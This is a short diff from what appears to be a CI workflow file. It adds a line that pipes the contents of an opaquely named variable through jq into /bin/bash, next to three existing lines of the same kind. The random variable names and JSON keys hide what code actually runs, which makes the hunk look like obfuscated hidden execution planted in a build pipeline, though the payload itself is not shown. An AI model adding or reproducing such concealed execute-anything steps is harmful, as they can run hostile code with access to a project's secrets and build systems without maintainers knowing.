@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$ho84" | jq -r .qmsdl69 | /bin/bash
           printf '%s' "$os74591" | jq -r .pmmlp67909 | /bin/bash
           echo $etrgd1 | jq -r .cky640 | /bin/bash
+          printf '%s' "$og4" | jq -r .bu1 | /bin/bash
 
       - name: Persist output
         if: always()
